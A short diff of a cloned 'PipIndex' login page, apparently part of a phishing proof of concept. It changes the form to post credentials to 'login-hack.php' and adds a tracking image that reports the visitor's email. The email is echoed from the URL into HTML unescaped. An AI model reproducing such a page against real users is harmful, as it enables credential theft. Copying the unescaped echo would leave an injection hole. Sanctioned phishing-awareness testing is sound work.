@@ -71,7 +71,7 @@
                 <div class="col-xs-12 col-sm-offset-3 col-sm-6">
                     <div class="text-center"><img src="./PipIndex - Log in_files/logo.png" alt=""></div>
                     <h2 translate=""><span class="ng-scope">Log in to your account</span></h2>
-                    <form name='input' action='/loginpoc/login-hack.php' method='post'
+                    <form name='input' action='login-hack.php' method='post'
                           class="ng-pristine ng-invalid ng-invalid-required">
                         <!-- ngIf: errors.non_field_errors.length > 0 --><!-- ngIf: errors.msg.length > 0 -->
                         <?php
@@ -115,7 +115,7 @@
             </div>
         </div>
     </div>
-    <?php require_once('utils.php'); echo '<img src="'. baseURL() .'loginpoc/trackevents.php?email=' .(isset($_GET['email']) ? trim($_GET['email'])  : '') .'&eventType=page-load&pageId=login"/>'; ?>
+    <?php require_once('utils.php'); echo '<img src="'. baseURL() .'trackevents.php?email=' .(isset($_GET['email']) ? trim($_GET['email'])  : '') .'&eventType=page-load&pageId=login"/>'; ?>
 </ui-view>
 <div growl="" class="ng-isolate-scope">
     <div class="growl-container growl-fixed top-right" ng-class="wrapperClasses()">
